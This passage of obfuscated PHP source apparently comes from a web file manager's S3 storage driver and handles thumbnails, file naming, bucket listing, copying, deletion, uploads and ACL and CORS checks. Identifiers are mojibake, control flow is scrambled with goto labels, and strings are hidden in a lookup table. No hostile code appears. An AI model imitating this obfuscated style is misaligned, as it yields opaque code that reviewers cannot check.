$càØŠ•ˆ¼Ğ =& $_SERVER[İåâé¾]; if (substr($e–ìĞîÜ²Ÿ, 0, 7) == $càØŠ•ˆ¼Ğ[150]) { $e–ìĞîÜ²Ÿ = $càØŠ•ˆ¼Ğ[151] . substr($e–ìĞîÜ²Ÿ, 7); } header($càØŠ•ˆ¼Ğ[152] . $e–ìĞîÜ²Ÿ); die; } public function cacheMehod($E•È¬™Ì‡†, $E’ëŠç‹) { goto FïÚ¯Ô©Ü; CœÒå››: $Aò¢’“Ù“[$e¼ïñÕ­¬è] = $EÓñí½¡èÍ; return $EÓñí½¡èÍ; goto AïÍà§¡âÆ; CÆ·‚·¤³‡: $EÓñí½¡èÍ = isset($Aò¢’“Ù“[$e¼ïñÕ­¬è]) ? $Aò¢’“Ù“[$e¼ïñÕ­¬è] : null; if (!is_null($EÓñí½¡èÍ)) { return $EÓñí½¡èÍ; } $EÓñí½¡èÍ = $this->{$E•È¬™Ì‡†}($E’ëŠç‹); goto CœÒå››; FïÚ¯Ô©Ü: $dğ‘ÅÚ´ÎÎ =& $_SERVER[İåâé¾]; static $Aò¢’“Ù“ = array(); $e¼ïñÕ­¬è = $dğ‘ÅÚ´ÎÎ[153] . $E•È¬™Ì‡† . $dğ‘ÅÚ´ÎÎ[154] . rtrim($E’ëŠç‹, $dğ‘ÅÚ´ÎÎ[8]); goto CÆ·‚·¤³‡; AïÍà§¡âÆ: } public function fileOutImage($EäÀÓ´¯èî, $C‘“×áë = 250) { goto A§ÀÓèäƒ¶; dĞ®¨Øöé: if (!($CË³©††“ê = IO::move($D®¸×ÉëåÎ, $B›á‘•…º))) { return IO::fileOut($D®¸×ÉëåÎ); } del_file($D®¸×ÉëåÎ); IO::fileOut($CË³©††“ê); goto E«‡–ÅÌñá; FíŒÆÇ×Ù´: $D®¸×ÉëåÎ = DATA_THUMB . $C£ØÆ‘ë«; if (!@file_exists($D®¸×ÉëåÎ)) { $eÅ’êÓù = TEMP_FILES; if (!is_dir($eÅ’êÓù)) { mk_dir($eÅ’êÓù); } $BùŸ½ìŠºœ = $eÅ’êÓù . $BøÎÏ¦Ô . $C°ÛèåìÙ•[90] . $dš“ÎäöÓ„[$C°ÛèåìÙ•[156]]; if (!@file_exists($BùŸ½ìŠºœ)) { $BùŸ½ìŠºœ = $this->download($EäÀÓ´¯èî, $BùŸ½ìŠºœ); } $e³†õ¾¤È = new ImageThumb($BùŸ½ìŠºœ, $C°ÛèåìÙ•[163]); $e³†õ¾¤È->prorate($D®¸×ÉëåÎ, $C‘“×áë, $C‘“×áë); } if (!file_exists($D®¸×ÉëåÎ) || filesize($D®¸×ÉëåÎ) < 100) { return @file_exists($BùŸ½ìŠºœ) ? IO::fileOut($BùŸ½ìŠºœ) : $this->fileOut($EäÀÓ´¯èî); } goto dĞ®¨Øöé; d©ŠëÈ™‚¹: if (!($eºË»ì××· = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $C°ÛèåìÙ•[161]))) { $B›á‘•…º = IO::mkdir(IO_PATH_SYSTEM_TEMP . $C°ÛèåìÙ•[162]); } else { $B›á‘•…º = KodIO::make($eºË»ì××·); } if ($eºË»ì××· = IO::fileNameExist($B›á‘•…º, $C£ØÆ‘ë«)) { $D®¸×ÉëåÎ = KodIO::make($eºË»ì××·); return IO::fileOut($D®¸×ÉëåÎ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto FíŒÆÇ×Ù´; A›Ü™’ò¸ê: if ($dš“ÎäöÓ„[$C°ÛèåìÙ•[78]] <= 1024 * 50 || !function_exists($C°ÛèåìÙ•[155]) || $dš“ÎäöÓ„[$C°ÛèåìÙ•[156]] == $C°ÛèåìÙ•[157]) { return $this->fileOut($EäÀÓ´¯èî); } if (isset($dš“ÎäöÓ„[$C°ÛèåìÙ•[158]][$C°ÛèåìÙ•[159]])) { $BøÎÏ¦Ô = $dš“ÎäöÓ„[$C°ÛèåìÙ•[158]][$C°ÛèåìÙ•[159]]; } else { if (isset($dš“ÎäöÓ„[$C°ÛèåìÙ•[158]][$C°ÛèåìÙ•[160]])) { $BøÎÏ¦Ô = $dš“ÎäöÓ„[$C°ÛèåìÙ•[158]][$C°ÛèåìÙ•[160]]; } else { $BøÎÏ¦Ô = md5("{$dš“ÎäöÓ„[$C°ÛèåìÙ•[28]]}\x5f{$dš“ÎäöÓ„[$C°ÛèåìÙ•[76]]}\x5f{$dš“ÎäöÓ„[$C°ÛèåìÙ•[78]]}"); } } $C£ØÆ‘ë« = "{$BøÎÏ¦Ô}\137{$C‘“×áë}\x2e\x70\156\147"; goto d©ŠëÈ™‚¹; A§ÀÓèäƒ¶: $C°ÛèåìÙ• =& $_SERVER[İåâé¾]; if (substr($EäÀÓ´¯èî, 0, 4) == $C°ÛèåìÙ•[140]) { $this->fileOutLink($EäÀÓ´¯èî); } $dš“ÎäöÓ„ = $this->info($EäÀÓ´¯èî); goto A›Ü™’ò¸ê; E«‡–ÅÌñá: } public function fileOutImageServer($a»âÍ¤©¯, $fƒ‰ÍøæÀ = 250) { self::fileOutImage($a»âÍ¤©¯, $fƒ‰ÍøæÀ); } public function fileNameAuto($A¿è¸Íª, $fŞË“˜¢šƒ, $CİëÀŠíöç = REPEAT_RENAME, $CÀÑè‹èÎ = false) { goto aìÓ—¦›ˆâ; aìÓ—¦›ˆâ: $D£ùõñ²—® =& $_SERVER[İåâé¾]; $A·éíæÒ­‡ = $A¿è¸Íª === $D£ùõñ²—®[33] ? $fŞË“˜¢šƒ : rtrim($A¿è¸Íª, $D£ùõñ²—®[8]) . $D£ùõñ²—®[8] . $fŞË“˜¢šƒ; if ($CİëÀŠíöç == REPEAT_REPLACE || !$this->exist($A·éíæÒ­‡) || $CÀÑè‹èÎ && $CİëÀŠíöç != REPEAT_RENAME_FOLDER) { return $fŞË“˜¢šƒ; } goto eùºê¿º§; eùºê¿º§: if ($CİëÀŠíöç == REPEAT_SKIP) { return !1; } $d¶Ï§™Š’» = $D£ùõñ²—®[90] . get_path_ext($fŞË“˜¢šƒ); $d¶Ï§™Š’» = $d¶Ï§™Š’» == $D£ùõñ²—®[90] || $CÀÑè‹èÎ ? $D£ùõñ²—®[33] : $d¶Ï§™Š’»; goto BÚ¥ÕŒ‚Âİ; Cöñ»š¶ƒÎ: while ($this->exist(rtrim($A¿è¸Íª, $D£ùõñ²—®[8]) . $D£ùõñ²—®[8] . $BŞİ¾ ÏğÖ)) { $BŞİ¾ ÏğÖ = $e±†®¸ ö . "\x28{$Eß†ØË®±Ô}\x29{$d¶Ï§™Š’»}"; $Eß†ØË®±Ô++; } return $BŞİ¾ ÏğÖ; goto bãéÆ°´Ø; BÚ¥ÕŒ‚Âİ: $Eß†ØË®±Ô = 1; $e±†®¸ ö = substr($fŞË“˜¢šƒ, 0, strlen($fŞË“˜¢šƒ) - strlen($d¶Ï§™Š’»)); $BŞİ¾ ÏğÖ = $e±†®¸ ö . "\50{$Eß†ØË®±Ô}\51{$d¶Ï§™Š’»}"; goto Cöñ»š¶ƒÎ; bãéÆ°´Ø: } public function listAllFiles($fÁÍØ—Ì’œ, $CÂ¿ÖËîë¶, $d†¦¶¶èª† = array()) { goto E†‘‚Êä; F’ìÅšİò: foreach (array_unique($fÂ±¨»±¤º) as $døåŒ½©Ù) { $dŒ÷‘¡‰¿‰ = array($A¢œËĞÁÎ¥[76] => $this->getPathOuter($A¢œËĞÁÎ¥[8] . $fÁÍØ—Ì’œ . $A¢œËĞÁÎ¥[8] . $døåŒ½©Ù), $A¢œËĞÁÎ¥[77] => 1, $A¢œËĞÁÎ¥[78] => 0); if (substr($døåŒ½©Ù, -1) != $A¢œËĞÁÎ¥[8]) { $dŒ÷‘¡‰¿‰[$A¢œËĞÁÎ¥[77]] = 0; $fŸô„›”Û = $this->getPath($fÁÍØ—Ì’œ . $A¢œËĞÁÎ¥[8] . $døåŒ½©Ù); $dŒ÷‘¡‰¿‰[$A¢œËĞÁÎ¥[78]] = isset($d†¦¶¶èª†[$fŸô„›”Û]) ? $d†¦¶¶èª†[$fŸô„›”Û] : $this->size($fŸô„›”Û); } $dÁâã–[] = $dŒ÷‘¡‰¿‰; } return $dÁâã–; goto FìÜï¯ğÆö; fº‰È‘ºÏ: $fÁÍØ—Ì’œ = trim($fÁÍØ—Ì’œ, $A¢œËĞÁÎ¥[8]); foreach ($CÂ¿ÖËîë¶ as $døåŒ½©Ù) { $E İÛ¹àë‚ = ltrim(substr($døåŒ½©Ù, strlen($fÁÍØ—Ì’œ)), $A¢œËĞÁÎ¥[8]); $fÂ±¨»±¤º = array_merge($fÂ±¨»±¤º, $this->slicePath($E İÛ¹àë‚)); } $dÁâã– = array(); goto F’ìÅšİò; E†‘‚Êä: $A¢œËĞÁÎ¥ =& $_SERVER[İåâé¾]; if (empty($CÂ¿ÖËîë¶)) { return array(); } $fÂ±¨»±¤º = array(); goto fº‰È‘ºÏ; FìÜï¯ğÆö: } public function slicePath($AĞ²¥ÁÍ) { $AñíÂõŒ =& $_SERVER[İåâé¾]; $a›¡Èµø¹Î = explode($AñíÂõŒ[8], trim($AĞ²¥ÁÍ, $AñíÂõŒ[8])); $C‰ß—ËÉ£Ò = 0; do { ++$C‰ß—ËÉ£Ò; $CÃ´°é·ÁŠ[] = implode($AñíÂõŒ[8], array_slice($a›¡Èµø¹Î, 0, $C‰ß—ËÉ£Ò)) . $AñíÂõŒ[8]; } while ($C‰ß—ËÉ£Ò < count($a›¡Èµø¹Î)); $CÃ´°é·ÁŠ[count($a›¡Èµø¹Î) - 1] = $AĞ²¥ÁÍ; return $CÃ´°é·ÁŠ; } public function getHost() { $A·›‚Ğ¾² =& $_SERVER[İåâé¾]; $DÍé‹’Ÿ©¢ = parse_url(trim($this->domain, $A·›‚Ğ¾²[8])); $b²¨Ú˜î… = isset($DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[164]]) ? $DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[164]] : http_type(); $D­¥ïƒ†Æƒ = isset($DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[165]]) ? $DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[165]] : $DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[76]]; if (isset($DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[166]])) { $D­¥ïƒ†Æƒ .= $A·›‚Ğ¾²[4] . $DÍé‹’Ÿ©¢[$A·›‚Ğ¾²[166]]; } return $b²¨Ú˜î… . $A·›‚Ğ¾²[167] . $D­¥ïƒ†Æƒ; } public function pathEncode($E¢Å»À„·) { $dŸ¤ä…ˆÊ© =& $_SERVER[İåâé¾]; return str_replace($dŸ¤ä…ˆÊ©[168], $dŸ¤ä…ˆÊ©[8], rawurlencode($E¢Å»À„·)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public function __construct($fÌèŒÑÔ«Ü) { set_timeout(); require_once SDK_DIR . $_SERVER[İåâé¾][169]; parent::__construct(); $this->_init($fÌèŒÑÔ«Ü); } public function _init($Fñ½™µµÒ) { foreach ($Fñ½™µµÒ as $d—™®ÌŠêê => $D¦•øÄÇè) { if (isset($this->{$d—™®ÌŠêê})) { $this->{$d—™®ÌŠêê} = $D¦•øÄÇè; } } $this->endpoint = $Fñ½™µµÒ[$_SERVER[İåâé¾][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($b¿‰Šèª¯Ğ = "\166\x34") { $this->signVer = $b¿‰Šèª¯Ğ; $this->client->setSignatureVersion($b¿‰Šèª¯Ğ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto EÀ¾¸ÉßµÔ; eëšâÔœô·: $CŠ™ğ‘Ó½Û = array($câ—ç‘¥¦ª[176], $câ—ç‘¥¦ª[177], $câ—ç‘¥¦ª[178], $câ—ç‘¥¦ª[179], $câ—ç‘¥¦ª[180]); $a‰êïÚíñ = array_diff($CŠ™ğ‘Ó½Û, $a¸öÙ››èª); return empty($a‰êïÚíñ); goto f¤¶ÔÍéÙ; EÀ¾¸ÉßµÔ: $câ—ç‘¥¦ª =& $_SERVER[İåâé¾]; $cÇİ öµ = $this->getBucketCors(); if (!$cÇİ öµ || !is_array($cÇİ öµ)) { return !1; } goto B‹•²¤ê; B‹•²¤ê: if ($cÇİ öµ[$câ—ç‘¥¦ª[171]] != $câ—ç‘¥¦ª[172] || $cÇİ öµ[$câ—ç‘¥¦ª[173]] != $câ—ç‘¥¦ª[172]) { return !1; } $a¸öÙ››èª = array_map($câ—ç‘¥¦ª[174], $cÇİ öµ[$câ—ç‘¥¦ª[175]]); if (!is_array($a¸öÙ››èª)) { $a¸öÙ››èª = array(); } goto eëšâÔœô·; f¤¶ÔÍéÙ: } public function mkfile($DóÈÔ‚—Ô¬, $CŒÌ¹…ˆŞ½ = '', $fË²™¨Ó»³ = REPEAT_RENAME) { $d§‹Ñó†“Ğ = $this->setContent($DóÈÔ‚—Ô¬, $CŒÌ¹…ˆŞ½); if ($d§‹Ñó†“Ğ !== !1) { return $this->getPathOuter($DóÈÔ‚—Ô¬); } return !1; } public function mkdir($aï¬£ùÅÑŒ, $c°‰Ë­ù¦Ì = REPEAT_SKIP) { if (empty($aï¬£ùÅÑŒ)) { return !1; } if ($this->isFolder($aï¬£ùÅÑŒ)) { return $this->getPathOuter($aï¬£ùÅÑŒ); } $BŸÎ÷¶†„Ã = $this->setContent($aï¬£ùÅÑŒ, $_SERVER[İåâé¾][33], !0); if ($BŸÎ÷¶†„Ã !== !1) { return $this->getPathOuter($aï¬£ùÅÑŒ); } return !1; } public function copyFile($e¯ÛÔš†Áƒ, $eéÃ®’¹÷É, $BŠ¼ Ù‡À = array()) { $DÍõõ¹´ =& $_SERVER[İåâé¾]; $cíñŠÃ‹¢Æ = $this->getObjectInfo($e¯ÛÔš†Áƒ); if (!$cíñŠÃ‹¢Æ) { return !1; } if ($cíñŠÃ‹¢Æ[$DÍõõ¹´[78]] <= 1024 * 1024 * 200) { $eï­ §…ä‡ = $this->client->copyObject($this->bucket, $e¯ÛÔš†Áƒ, $this->bucket, $eéÃ®’¹÷É, $DÍõõ¹´[181], $BŠ¼ Ù‡À); } else { $eï­ §…ä‡ = $this->client->multiCopyObject($this->bucket, $e¯ÛÔš†Áƒ, $this->bucket, $eéÃ®’¹÷É, $BŠ¼ Ù‡À); } $eï­ §…ä‡ = $eï­ §…ä‡ ? $this->getPathOuter($eéÃ®’¹÷É) : !1; return $eï­ §…ä‡; } public function moveFile($Bİ„…òòµé, $F† “™…§‚) { if ($this->copyFile($Bİ„…òòµé, $F† “™…§‚)) { $this->delFile($Bİ„…òòµé); return $this->getPathOuter($F† “™…§‚); } return !1; } public function delFile($cÁè—†„²É) { return $this->client->deleteObject($this->bucket, $cÁè—†„²É); } public function delFolder($b¾ô§³˜ ó) { goto Aé•³ÎÄƒù; D·Ø°ĞÙ›Š: return $Dã¬†”ˆ === $C‚ïõŒ¦à ? !0 : !1; goto CÆ’Í¶Íóø; Aé•³ÎÄƒù: $FÓŠÇĞ©” =& $_SERVER[İåâé¾]; $eÖŞêêÖì = $this->listObjs($b¾ô§³˜ ó); if (!$eÖŞêêÖì) { $b¾ô§³˜ ó = trim($b¾ô§³˜ ó, $FÓŠÇĞ©”[8]); if (!empty($b¾ô§³˜ ó)) { $b¾ô§³˜ ó .= $FÓŠÇĞ©”[8]; } return $this->delFile($b¾ô§³˜ ó); } goto A¿ƒ‚Í¬Ï; A¿ƒ‚Í¬Ï: $Dã¬†”ˆ = $C‚ïõŒ¦à = 0; $DÑ•ŠØ¸ = array_chunk(array_keys($eÖŞêêÖì), 1000); foreach ($DÑ•ŠØ¸ as $c®Ê¸°) { $Dã¬†”ˆ++; $C‚ïõŒ¦à += (int) $this->client->deleteObjects($this->bucket, $c®Ê¸°); } goto D·Ø°ĞÙ›Š; CÆ’Í¶Íóø: } public function rename($F«ÓÈ¯°ÀÊ, $DÜªßÕ¶¯ç) { return $this->renameObject($F«ÓÈ¯°ÀÊ, $DÜªßÕ¶¯ç); } public function size($e…‹Ğ¸è ) { $DÌÆãö» =& $_SERVER[İåâé¾]; $B“ÈÀ²Êò = $this->info($e…‹Ğ¸è ); return isset($B“ÈÀ²Êò[$DÌÆãö»[78]]) ? $B“ÈÀ²Êò[$DÌÆãö»[78]] : 0; } public function _info($D’…¾åÓ¤Ú) { if ($this->isFolder($D’…¾åÓ¤Ú)) { return $this->folderInfo($D’…¾åÓ¤Ú, 1); } return $this->fileInfo($D’…¾åÓ¤Ú); } public function info($D„ˆ£¡‡¸) { return $this->cacheMehod($_SERVER[İåâé¾][182], $D„ˆ£¡‡¸); } public function isFile($E¤±öõØ©) { return $this->cacheMehod($_SERVER[İåâé¾][183], $E¤±öõØ©); } public function isFolder($AÑšµ±) { return $this->cacheMehod($_SERVER[İåâé¾][184], $AÑšµ±); } public function getObjectInfo($Cá§Ë°éß¢) { return $this->_getObjectInfo($Cá§Ë°éß¢); } public function exist($cÇ÷ß™²á) { if ($this->isFile($cÇ÷ß™²á)) { return !0; } return $this->isFolder($cÇ÷ß™²á); } public function _isFile($f·ä­Ñâ”) { return $this->client->getObjectInfo($this->bucket, trim($f·ä­Ñâ”, $_SERVER[İåâé¾][8]), !1); } public function _isFolder($Eù‘Ìê“¢ˆ) { $DßÈÄ¢‚¼¬ = $this->listObjs($Eù‘Ìê“¢ˆ, null, 1); return !empty($DßÈÄ¢‚¼¬) ? !0 : !1; } public function listPath($d¨›î÷é¯°, $cºÒµ¿½ª¹ = false, $DÖÄ¼£ŸîË = false) { $aŸ¤É ”¢ =& $_SERVER[İåâé¾]; $Dê—ÏšëÎ– = $this->listObjs($d¨›î÷é¯°, null, null, $aŸ¤É ”¢[8]); $Fèğ—®œ£ = array($aŸ¤É ”¢[75] => array(), $aŸ¤É ”¢[74] => array()); foreach ($Dê—ÏšëÎ– as $b›¼Ÿ²À‰ => $eäïà«İÌƒ) { if ($b›¼Ÿ²À‰ == $aŸ¤É ”¢[8]) { continue; } if (isset($eäïà«İÌƒ[$aŸ¤É ”¢[185]])) { $Fèğ—®œ£[$aŸ¤É ”¢[75]][] = $this->folderInfo($eäïà«İÌƒ[$aŸ¤É ”¢[185]], $cºÒµ¿½ª¹, $DÖÄ¼£ŸîË); } else { if (substr($eäïà«İÌƒ[$aŸ¤É ”¢[28]], -1) == $aŸ¤É ”¢[8]) { continue; } $Fèğ—®œ£[$aŸ¤É ”¢[74]][] = $this->fileInfo($eäïà«İÌƒ[$aŸ¤É ”¢[28]], $eäïà«İÌƒ, $DÖÄ¼£ŸîË); } } return $Fèğ—®œ£; } private function fileInfo($E¹Ñ¤µì¦Ã, $f‡°¾íÍ…ì = array(), $a‹‰¶®›Õ = false) { goto AŠÎƒâ©†Ş; CÏ¾ÛÁÑ³Ö: return $Bï¯³½‹Œ¡; goto A­¬¶äÁÚ; BÅ´ğ²¼¬: if (empty($f‡°¾íÍ…ì)) { $f‡°¾íÍ…ì = $this->getObjectInfo($E¹Ñ¤µì¦Ã); if (!$f‡°¾íÍ…ì) { return $Bï¯³½‹Œ¡; } $this->fileInfoImage($E¹Ñ¤µì¦Ã, $Bï¯³½‹Œ¡); } $Bï¯³½‹Œ¡[$cêÁ†Ã£Ì¾[105]] = $f‡°¾íÍ…ì[$cêÁ†Ã£Ì¾[189]]; $Bï¯³½‹Œ¡[$cêÁ†Ã£Ì¾[78]] = $f‡°¾íÍ…ì[$cêÁ†Ã£Ì¾[78]]; goto CÏ¾ÛÁÑ³Ö; AŠÎƒâ©†Ş: $cêÁ†Ã£Ì¾ =& $_SERVER[İåâé¾]; if ($a‹‰¶®›Õ) { return array($cêÁ†Ã£Ì¾[28] => $this->pathThis($E¹Ñ¤µì¦Ã), $cêÁ†Ã£Ì¾[76] => $this->getPathOuter($E¹Ñ¤µì¦Ã), $cêÁ†Ã£Ì¾[29] => $cêÁ†Ã£Ì¾[163], $cêÁ†Ã£Ì¾[156] => $this->ext($E¹Ñ¤µì¦Ã), $cêÁ†Ã£Ì¾[78] => isset($f‡°¾íÍ…ì[$cêÁ†Ã£Ì¾[78]]) ? $f‡°¾íÍ…ì[$cêÁ†Ã£Ì¾[78]] : 0); } $Bï¯³½‹Œ¡ = array($cêÁ†Ã£Ì¾[28] => $this->pathThis($E¹Ñ¤µì¦Ã), $cêÁ†Ã£Ì¾[76] => $this->getPathOuter($E¹Ñ¤µì¦Ã), $cêÁ†Ã£Ì¾[29] => $cêÁ†Ã£Ì¾[163], $cêÁ†Ã£Ì¾[186] => $cêÁ†Ã£Ì¾[50], $cêÁ†Ã£Ì¾[105] => $cêÁ†Ã£Ì¾[50], $cêÁ†Ã£Ì¾[78] => 0, $cêÁ†Ã£Ì¾[156] => $this->ext($E¹Ñ¤µì¦Ã), $cêÁ†Ã£Ì¾[187] => !0, $cêÁ†Ã£Ì¾[188] => !0); goto BÅ´ğ²¼¬; A­¬¶äÁÚ: } private function folderInfo($bŸÍßœ•¨ã, $a°¼Ù”Å˜ = 0, $AøÍº‘øÉ´ = false) { goto c°’¼å”Ü; d©ŸÛŠÖ: return $FÎ³Ñ– äˆ; goto eåéƒª„±‰; E­î¤¡öô: if ($bŸÍßœ•¨ã == $C³ÔÛâñèÃ[33]) { return $FÎ³Ñ– äˆ; } $E‰ØÅòÜ„ = $this->getObjectInfo(trim($bŸÍßœ•¨ã, $C³ÔÛâñèÃ[8]) . $C³ÔÛâñèÃ[8]); if (!$E‰ØÅòÜ„) { return $FÎ³Ñ– äˆ; } goto C±İáÅÉ; C±İáÅÉ: $FÎ³Ñ– äˆ[$C³ÔÛâñèÃ[186]] = $E‰ØÅòÜ„[$C³ÔÛâñèÃ[189]]; $FÎ³Ñ– äˆ[$C³ÔÛâñèÃ[105]] = $E‰ØÅòÜ„[$C³ÔÛâñèÃ[189]]; if ($a°¼Ù”Å˜) { $FÎ³Ñ– äˆ[$C³ÔÛâñèÃ[190]] = $this->has($bŸÍßœ•¨ã, !1); $FÎ³Ñ– äˆ[$C³ÔÛâñèÃ[191]] = $this->has($bŸÍßœ•¨ã, !0); } goto d©ŸÛŠÖ; c°’¼å”Ü: $C³ÔÛâñèÃ =& $_SERVER[İåâé¾]; if ($AøÍº‘øÉ´) { return array($C³ÔÛâñèÃ[28] => $this->pathThis($bŸÍßœ•¨ã), $C³ÔÛâñèÃ[76] => $this->getPathOuter($C³ÔÛâñèÃ[8] . $bŸÍßœ•¨ã), $C³ÔÛâñèÃ[29] => $C³ÔÛâñèÃ[77]); } $FÎ³Ñ– äˆ = array($C³ÔÛâñèÃ[28] => $this->pathThis($bŸÍßœ•¨ã), $C³ÔÛâñèÃ[76] => $this->getPathOuter($C³ÔÛâñèÃ[8] . $bŸÍßœ•¨ã), $C³ÔÛâñèÃ[29] => $C³ÔÛâñèÃ[77], $C³ÔÛâñèÃ[186] => $C³ÔÛâñèÃ[50], $C³ÔÛâñèÃ[105] => $C³ÔÛâñèÃ[50], $C³ÔÛâñèÃ[190] => 1, $C³ÔÛâñèÃ[191] => 1, $C³ÔÛâñèÃ[187] => !0, $C³ÔÛâñèÃ[188] => !0); goto E­î¤¡öô; eåéƒª„±‰: } public function listObjs($DÉõŠö„¦¢, $fƒ‹äá ‹Œ = null, $F¯‹±ƒÀ˜ = null, $EÃƒÅ¾ïâ = null) { $aÖˆãï´“ =& $_SERVER[İåâé¾]; $DÉõŠö„¦¢ = trim($DÉõŠö„¦¢, $aÖˆãï´“[8]); $AÂø”İ´Ë = empty($DÉõŠö„¦¢) ? $aÖˆãï´“[33] : $DÉõŠö„¦¢ . $aÖˆãï´“[8]; return $this->client->getBucket($this->bucket, $AÂø”İ´Ë, $fƒ‹äá ‹Œ, $F¯‹±ƒÀ˜, $EÃƒÅ¾ïâ, !0); } public function has($E©õİŠ£ÓŒ, $CÕŒ¿Òè = true) { $Dñ¦ê”ƒŒ’ =& $_SERVER[İåâé¾]; $B—¹ãŒÀ÷‰ = null; $AùİäÔã†å = 20; $FÛ÷ˆñÓ = $Dñ¦ê”ƒŒ’[8]; while (!0) { $Bâä›Ş¼á = $this->listObjs($E©õİŠ£ÓŒ, $B—¹ãŒÀ÷‰, $AùİäÔã†å, $FÛ÷ˆñÓ); if (!$Bâä›Ş¼á) { return !1; } end($Bâä›Ş¼á); $B—¹ãŒÀ÷‰ = key($Bâä›Ş¼á); if ($CÕŒ¿Òè) { foreach ($Bâä›Ş¼á as $e»£á‰î) { if (isset($e»£á‰î[$Dñ¦ê”ƒŒ’[28]]) && substr($e»£á‰î[$Dñ¦ê”ƒŒ’[28]], -1) != $Dñ¦ê”ƒŒ’[8]) { return !0; } } } else { foreach ($Bâä›Ş¼á as $e»£á‰î) { if (isset($e»£á‰î[$Dñ¦ê”ƒŒ’[185]])) { return !0; } } } if (count($Bâä›Ş¼á) < $AùİäÔã†å || !$B—¹ãŒÀ÷‰) { break; } } return !1; } public function listAll($BÂ¸ªÂ‰¼Ø) { $d’ÛïçŞàš =& $_SERVER[İåâé¾]; $d˜ñ¨¿ä×š = $this->listObjs($BÂ¸ªÂ‰¼Ø); $F‡ƒªî‡†ƒ = $dìĞ‡åòÃØ = array(); foreach ($d˜ñ¨¿ä×š as $f‘ÁÊ ÃØ… => $EëˆĞ©íåÁ) { $F‡ƒªî‡†ƒ[] = $EëˆĞ©íåÁ[$d’ÛïçŞàš[28]]; $dìĞ‡åòÃØ[$f‘ÁÊ ÃØ…] = $EëˆĞ©íåÁ[$d’ÛïçŞàš[78]]; } return $this->listAllFiles($BÂ¸ªÂ‰¼Ø, $F‡ƒªî‡†ƒ, $dìĞ‡åòÃØ); } public function canRead($C¹ÖãÇ×Ì) { $F†ˆä¡Ô£¬ =& $_SERVER[İåâé¾]; $fÉ¢ÊŒ¦¤à = $this->client->getAccessControlPolicy($this->bucket, $C¹ÖãÇ×Ì); if (!$fÉ¢ÊŒ¦¤à) { return !1; } return in_array($fÉ¢ÊŒ¦¤à, array($F†ˆä¡Ô£¬[192], $F†ˆä¡Ô£¬[193], $F†ˆä¡Ô£¬[194])) ? !0 : !1; } public function canWrite($c‡òéĞ¼¡Ô) { $BÚ¸•†’› =& $_SERVER[İåâé¾]; $fÅ×á„ñ§ = $this->client->getAccessControlPolicy($this->bucket, $c‡òéĞ¼¡Ô); if (!$fÅ×á„ñ§) { return !1; } return in_array($fÅ×á„ñ§, array($BÚ¸•†’›[192], $BÚ¸•†’›[193])) ? !0 : !1; } public function getContent($eË®˜š‚Øê) { return $this->client->getObject($this->bucket, $eË®˜š‚Øê); } public function setContent($BÅŞÈÎ›ğ, $e¥¨ˆÈ¶Ùğ = '', $C¢÷ÕÓ‘ = false) { goto bµ•©‹š—Ö; b¬Î°…µÜç: $f ‡˜‘ºĞ = $this->client->putObject($e¥¨ˆÈ¶Ùğ, $this->bucket, $BÅŞÈÎ›ğ, $FÔÂ¸§ùÒ[181], array(), $a……Š×ßø¸); if (!$f ‡˜‘ºĞ) { return !1; } if ($C¢÷ÕÓ‘) { return !0; } goto D¬ŞÕ–¨˜­; bµ•©‹š—Ö: $FÔÂ¸§ùÒ =& $_SERVER[İåâé¾]; $BÅŞÈÎ›ğ = $C¢÷ÕÓ‘ ? trim($BÅŞÈÎ›ğ, $FÔÂ¸§ùÒ[8]) . $FÔÂ¸§ùÒ[8] : $BÅŞÈÎ›ğ; $a……Š×ßø¸ = get_file_mime(get_path_ext($BÅŞÈÎ›ğ)); goto b¬Î°…µÜç; D¬ŞÕ–¨˜­: $f ‡˜‘ºĞ = $this->copyFile($BÅŞÈÎ›ğ, $BÅŞÈÎ›ğ, array($FÔÂ¸§ùÒ[195] => $f ‡˜‘ºĞ[$FÔÂ¸§ùÒ[196]])); return $f ‡˜‘ºĞ ? !0 : !1; goto d˜•¢íöŞª; d˜•¢íöŞª: } public function fileSubstr($A¶ä®Ø–˜Á, $bè²ä•‰„±, $Cå×ªè§Æğ) { $eš›¡åÉÌ = $bè²ä•‰„± + $Cå×ªè§Æğ - 1; return $this->client->getObject($this->bucket, $A¶ä®Ø–˜Á, array($_SERVER[İåâé¾][197] => "\142\x79\164\145\163\75{$bè²ä•‰„±}\x2d{$eš›¡åÉÌ}")); } public function upload($cœÄÍÑºé, $Cğ‰Àª×¯, $A‚´Éê·ŠÜ = false, $bëêˆŒœË‚ = REPEAT_REPLACE) { $d¬‘ÄÎñÒ™ =& $_SERVER[İåâé¾]; $eÁ¿ÏÕ±Éá = array($d¬‘ÄÎñÒ™[195] => @md5_file($Cğ‰Àª×¯)); $F¨Üò©ÂÊ = array($d¬‘ÄÎñÒ™[198] => get_file_mime(get_path_ext($cœÄÍÑºé))); if (IO::size($Cğ‰Àª×¯) <= 1024 * 1024 * 200) { $Aµ‘Ş˜éâ = $this->client->putObjectFile($Cğ‰Àª×¯, $this->bucket, $cœÄÍÑºé, $d¬‘ÄÎñÒ™[181], $eÁ¿ÏÕ±Éá, $F¨Üò©ÂÊ); return !empty($Aµ‘Ş˜éâ) ? $this->getPathOuter($cœÄÍÑºé) : !1; } $fç¹ƒÙíÎ  = $this->client->multiUploadObject($Cğ‰Àª×¯, $this->bucket, trim($cœÄÍÑºé, $d¬‘ÄÎñÒ™[8]), $eÁ¿ÏÕ±Éá, $F¨Üò©ÂÊ); return $fç¹ƒÙíÎ  ? $this->getPathOuter($cœÄÍÑºé) : !1; } public function download($a¢Ã‚‡ÖÕ, $EÍ‰™ÑéğÕ) { if 